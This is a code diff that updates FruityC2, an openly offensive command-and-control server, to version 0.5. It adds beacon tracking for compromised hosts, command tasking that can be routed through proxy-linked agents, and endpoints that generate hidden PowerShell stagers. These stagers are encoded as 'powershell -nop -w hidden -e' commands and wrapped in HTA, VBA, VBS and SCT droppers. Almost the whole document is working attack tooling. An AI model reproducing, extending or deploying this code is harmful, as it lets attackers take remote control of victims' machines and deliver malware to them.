@@ -57,7 +57,7 @@ log.setLevel(logging.ERROR)
 requests.packages.urllib3.disable_warnings() # DISABLE SSL CHECK WARNINGS
 
 # FRUITYC2 BANNER
-__version__ = "0.4"
+__version__ = "0.5"
 print_banner(__version__)
 
 # LOAD PARAMETERS
@@ -313,6 +313,7 @@ def beaconSendTask(request):
     name = target_data[4]
     ip = target_data[5]
     os_arch = "32-bit" # target_data[6] # NOT IMPLEMENTED
+    mode = target_data[7]
     
     if uuid not in gdata.target:
         print "%s%s[NEW BEACON]%s" % (bcolors.GREEN, bcolors.BOLD, bcolors.ENDC)
@@ -329,7 +330,9 @@ def beaconSendTask(request):
             "sleep": 5,
             "user": user,
             "checkin": timestamp,
-            "level": int(label) # 0=Untrusted, 1=Low, 2=Medium, 3=High, 4=System :: [Integrity Level]
+            "level": int(label), # 0=Untrusted, 1=Low, 2=Medium, 3=High, 4=System :: [Integrity Level]
+            "mode": mode, #normal, proxy, passive, webpipe
+            "route": ""
             }
         
         store_target() # STORE TARGETS
@@ -347,12 +350,14 @@ def beaconSendTask(request):
         print "%s%s[BEACON]%s" % (bcolors.GREEN, bcolors.BOLD, bcolors.ENDC)
         print "%sUUID:%s %s" % (bcolors.BOLD, bcolors.ENDC, uuid)
         print "%sVERSION:%s %s" % (bcolors.BOLD, bcolors.ENDC, os_version)
-        print "%sCOMMAND:%s %s" % (bcolors.BOLD, bcolors.ENDC, gdata.target[uuid]["exec"][:20])
+        print "%sCOMMAND:%s %s" % (bcolors.BOLD, bcolors.ENDC, gdata.target[uuid]["exec"][:50])
         print
         
         gdata.target[uuid]["checkin"] = timestamp
         
         save_log_json(uuid) # STORE LOGS
+        
+        #print "DEBUG SEND TASK: %s" % gdata.target[uuid]["exec"][:200]
         
         data = tx_data(gdata.target[uuid]["exec"]) # ENCRYPT/ENCODE DATA TO TRANSFER
         gdata.target[uuid]["exec"] = ""
@@ -372,7 +377,7 @@ def beaconSendTask(request):
     return resp
 
 def beaconGetData(request):
-    profile = load_profile(profile_file)
+    profile = load_profile(profile_file)    
     
     try:
         if option_base64:
@@ -395,19 +400,77 @@ def beaconGetData(request):
         # GET TARGET UNIQID
         uuid = get_uuid(request)["uuid"]
         # OLD [SEND]
-        print "%s%s[SEND-TASK]%s" % (bcolors.CYAN, bcolors.BOLD, bcolors.ENDC)
+        #print "%s%s[SEND-TASK]%s" % (bcolors.CYAN, bcolors.BOLD, bcolors.ENDC)
+        print "%s%s[GET-RESULT]%s" % (bcolors.CYAN, bcolors.BOLD, bcolors.ENDC)
         print "%sUUID:%s %s" % (bcolors.BOLD, bcolors.ENDC, uuid)
         print "%s%s[+]%s %s bytes" % (bcolors.GREEN, bcolors.BOLD, bcolors.ENDC, data_size)
         print
+        
+        # ---------- PATCH NEW MODES ------------ -> THIS NEEDS TO BE DONE BY [LINK] COMMAND
+        if uuid not in gdata.target:
+            session_id = profile["session_id"]
+            target_data = rx_data(request.cookies.get(session_id)).split("|")
+            #print target_data
+            
+            timestamp = int(time.time())
+            
+            #target_data = rx_data(request.cookies.get('SESSIONID')).split("|")
+            session_id = profile["session_id"]
+            target_data = rx_data(request.cookies.get(session_id)).split("|")
+            
+            uuid = target_data[0]
+            os_version = target_data[1]
+            user = target_data[2]
+            label = target_data[3]
+            name = target_data[4]
+            ip = target_data[5]
+            os_arch = "32-bit" # target_data[6] # NOT IMPLEMENTED
+            mode = target_data[7]
+            
+            print "%s%s[NEW BEACON]%s" % (bcolors.GREEN, bcolors.BOLD, bcolors.ENDC)
+            print "%sUUID:%s %s" % (bcolors.BOLD, bcolors.ENDC, uuid)
+            print "%sVERSION:%s %s" % (bcolors.BOLD, bcolors.ENDC, os_version)
+            
+            gdata.target[uuid] = {
+                "os_version": os_version,
+                "os_arch": os_arch,
+                "name": name,
+                "ip": ip,
+                "exec": "",
+                "last_command": "",
+                "sleep": 5,
+                "user": user,
+                "checkin": timestamp,
+                "level": int(label), # 0=Untrusted, 1=Low, 2=Medium, 3=High, 4=System :: [Integrity Level]
+                "mode": mode, #normal, proxy, passive, webpipe
+                "route": ""
+                }
 
+            store_target() # STORE TARGETS
+            save_log_json(uuid) # STORE LOGS
+        # ---------- PATCH NEW MODES ------------./
+        
+        # STORE CHECKIN TIME
+        timestamp = int(time.time())
+        if data[0].startswith("linked:"):
+            gdata.target[uuid]["route"] = data[0].replace("linked:","")
+            #gdata.target[uuid]["proxy"] = "%s:%s" % ("localhost", "8080")
+            gdata.target[uuid]["proxy"] = gdata.proxy
+
+        gdata.target[uuid]["checkin"] = timestamp
+        store_target()
+        
         content = ""
         for line in data:
             if option_debug: print line.strip()
             content += line.strip() + "\n"
-        
-        last_command = gdata.target[uuid]["last_command"].strip()
-        if option_debug: print "DEBUG: %s" % last_command
-        
+        try:
+            last_command = gdata.target[uuid]["last_command"].strip()
+            if option_debug: print "DEBUG: %s" % last_command
+        except:
+            last_command = ""
+            if option_debug: print "DEBUG [ERROR]: %s" % last_command
+            
         # PROCESS RESPONSE FROM AGENT/TARGET
         content = control.get_response(content, last_command, uuid)
             
@@ -457,6 +520,8 @@ def setAgent(request):
     label = target_data[3]
     name = target_data[4]
     ip = target_data[5]
+    os_arch = target_data[6]
+    mode = target_data[7]
     
     if uuid not in gdata.target:
         print "%s%s[NEW BEACON STAGER]%s" % (bcolors.GREEN, bcolors.BOLD, bcolors.ENDC)
@@ -466,6 +531,7 @@ def setAgent(request):
         
         gdata.target[uuid] = {
             "os_version": os_version,
+            "os_arch": os_arch,
             "name": name,
             "ip": ip,
             "exec": "",
@@ -473,7 +539,9 @@ def setAgent(request):
             "sleep": 5,
             "user": user,
             "checkin": timestamp,
-            "level": int(label) # 0=Untrusted, 1=Low, 2=Medium, 3=High, 4=System :: [Integrity Level]
+            "level": int(label), # 0=Untrusted, 1=Low, 2=Medium, 3=High, 4=System :: [Integrity Level]
+            "mode": mode,
+            "route": ""
             }
         
         store_target() # STORE TARGETS
@@ -516,6 +584,7 @@ def get_uuid(request):
     name = target_data[4]
     ip = target_data[5]
     os_arch = "32-bit" #target_data[6]
+    mode = "normal" #target_data[7]
     
     data = {}
     data["uuid"] = uuid
@@ -525,6 +594,7 @@ def get_uuid(request):
     data["name"] = name
     data["ip"] = ip
     data["os_arch"] = os_arch
+    data["mode"] = mode
     
     return data
 
@@ -557,14 +627,45 @@ def bot_control_get():
         print "%sUUID:%s %s" % (bcolors.BOLD, bcolors.ENDC, param_target)
         print "%sCOMMAND:%s %s" % (bcolors.BOLD, bcolors.ENDC, param)
         print
-        gdata.target[param_target]["last_command"] = param
         
-        save_log_raw(param_target, "[*] set command: %s \n" % param[:100])
+        # SEND COMMAND TO PROXY
+        #set_proxy_task*localhost*8080*1487672089*powershell ls
         
-        # SET CONTROL COMMAND
-        _exec = control.set_command(param, param_target)
+        # GET RESULT FROM PROXY
+        #get_proxy_result*localhost*8080*1487672089
+        
+        if gdata.target[param_target]["mode"] == "passive":
+            proxy = gdata.target[param_target]["proxy"].split(":")
+            proxy_dest = proxy[0]
+            proxy_port = proxy[1]
             
-        resp = Response(json.dumps(_exec))
+            #print "DEBUG EXEC: %s" % param 
+            
+            proxy_param = "set_proxy_task*%s*%s*%s*%s" % (proxy_dest, proxy_port, param_target, param)
+            proxy_param = "%s*%s*%s" % (proxy_dest, proxy_port, param_target)
+            proxy_target = gdata.target[param_target]["route"]
+            
+            gdata.target[param_target]["last_command"] = proxy_param + param
+            
+            #print "DEBUG: %s" % proxy_param
+            save_log_raw(param_target, "[*] set command: %s \n" % param[:500])
+        
+            # SET CONTROL COMMAND [Control.py]
+            #_exec = control.set_command(proxy_param + param, proxy_target, proxy_param)
+            _exec = control.set_command(param, proxy_target, proxy_param)
+            
+            resp = Response(json.dumps(_exec))
+            
+        else:
+            
+            gdata.target[param_target]["last_command"] = param
+            
+            save_log_raw(param_target, "[*] set command: %s \n" % param[:500])
+        
+            # SET CONTROL COMMAND
+            _exec = control.set_command(param, param_target, "")
+                
+            resp = Response(json.dumps(_exec))
         return resp
     except:
         print traceback.print_exc()
@@ -597,7 +698,7 @@ def target_exit():
 # PAYLOADS
 # -----------------------
 
-# SET PAYLOAD 
+# SET PAYLOAD
 def set_payload_template(template, payload_code, listener_id):
     profile = load_profile(profile_file)
     
@@ -631,7 +732,102 @@ def set_payload_template(template, payload_code, listener_id):
             
     return data
 
-# GENERATE CODE
+def set_payload_delivery_code(template, payload_code):    
+    data = ""
+    with open(template) as f:
+        for line in f:
+            
+            if "**useragent**" in line:
+                line = line.replace("**useragent**", useragent)
+            if "**domain**" in line:
+                line = line.replace("**domain**", domain)
+            if "**port**" in line:
+                line = line.replace("**port**", port)
+            if "**path**" in line:
+                line = line.replace("**path**", path)
+            if "**payload_code**" in line:
+                line = line.replace("**payload_code**", payload_code)
+            if "**ssl**" in line:
+                line = line.replace("**ssl**", ssl)
+            data += line
+            
+    return data
+
+# GENERATE ENCODED COMMNAD
+@app.route('/generate/encoder/<code>')
+def generate_code_encoded(code):
+    # VERIFY IF SOURCE IP IS ALLOWED
+    if validate_source_ip(request): return get_profile_headers_denied()
+    
+    #code = base64.b64decode(code)
+    code = b64decoder(code)
+    #data =  powershell_encoder_deflate(code)
+    data = powershell_encoder(code)
+    
+    data = base64.b64encode(data)
+    resp = Response(json.dumps(data))
+    return resp
+
+def set_payload_delivery_type(gen_payload, code):
+    
+    stager = code
+    
+    if gen_payload == "powershell":
+        data = "%s" % stager
+        
+    elif gen_payload == "powershell-command":
+        # Powershell EncodedCommand output
+        data = "powershell -nop -w hidden -e %s" % powershell_encoder_deflate(code)
+        
+    elif gen_payload == "hta":
+        payload_code = "powershell.exe -nop -w hidden -e %s" % powershell_encoder_deflate(code)
+        data = set_payload_delivery_code("payload_template/payload_hta.txt", payload_code)
+        
+    elif gen_payload == "vba":
+        
+        line = powershell_encoder_deflate(code)
+        n = 900
+        encoded_chunks = [line[i:i+n] for i in range(0, len(line), n)]
+        
+        payload_code = "\"powershell.exe -nop -w hidden -e \"\n"
+        for i in encoded_chunks:
+            payload_code += "Code = Code & \"%s\"\n" % i
+
+        data = set_payload_delivery_code("payload_template/payload_vba.txt", payload_code)
+    
+    elif gen_payload == "vbs":
+        payload_code = "powershell.exe -nop -w hidden -e %s" % powershell_encoder_deflate(code)
+        data = set_payload_delivery_code("payload_template/payload_vbs.txt", payload_code)
+    
+    elif gen_payload == "sct":
+        payload_code = "powershell.exe -nop -w hidden -e %s" % powershell_encoder_deflate(code)
+        data = set_payload_delivery_code("payload_template/payload_sct.txt", payload_code)
+
+    return data
+
+# GENERATE CODE STAGER
+@app.route('/generate/proxy/<gen_port>/<gen_payload>')
+def generate_code_proxy(gen_port, gen_payload):
+    # VERIFY IF SOURCE IP IS ALLOWED
+    if validate_source_ip(request): return get_profile_headers_denied()
+
+    data = ""
+    with open("agent/ps_proxy.ps1") as f:
+        for line in f:
+            if "**port**" in line:
+                line = line.replace("**port**", gen_port)
+            data += line
+    
+    proxy = strip_powershell_comments(data)
+    
+    # SET PAYLOAD DELIVERY TYPE WITH PROXY
+    data = set_payload_delivery_type(gen_payload, proxy)
+    
+    data = base64.b64encode(data)
+    resp = Response(json.dumps(data))
+    return resp
+
+# GENERATE CODE STAGER
 @app.route('/generate/<gen_listener>/<gen_payload>')
 def generate_code(gen_listener, gen_payload):
     # VERIFY IF SOURCE IP IS ALLOWED
@@ -648,7 +844,11 @@ def generate_code(gen_listener, gen_payload):
     #stager = set_payload_template("payload_template/stager.txt","", gen_listener)
     stager = set_payload_template("agent/ps_stager.ps1","", gen_listener)
     stager = strip_powershell_comments(stager)
+    
+    # SET PAYLOAD DELIVERY TYPE WITH STAGER
+    data = set_payload_delivery_type(gen_payload, stager)
 
+    '''
     if gen_payload == "powershell":
         #data = "powershell -nop -w hidden -c \"%s\"" % stager
         data = "%s" % stager
@@ -676,9 +876,14 @@ def generate_code(gen_listener, gen_payload):
         #payload_code = "powershell.exe -nop -w hidden -e %s" % powershell_encoder(stager)
         data = set_payload_template("payload_template/payload_vba.txt", payload_code, gen_listener)
     
+    elif gen_payload == "vbs":
+        payload_code = "powershell.exe -nop -w hidden -e %s" % powershell_encoder_deflate(stager)
+        data = set_payload_template("payload_template/payload_vbs.txt", payload_code, gen_listener)
+    
     elif gen_payload == "sct":
         payload_code = "powershell.exe -nop -w hidden -e %s" % powershell_encoder_deflate(stager)
         data = set_payload_template("payload_template/payload_sct.txt", payload_code, gen_listener)
+    '''
     
     data = base64.b64encode(data)
     resp = Response(json.dumps(data))
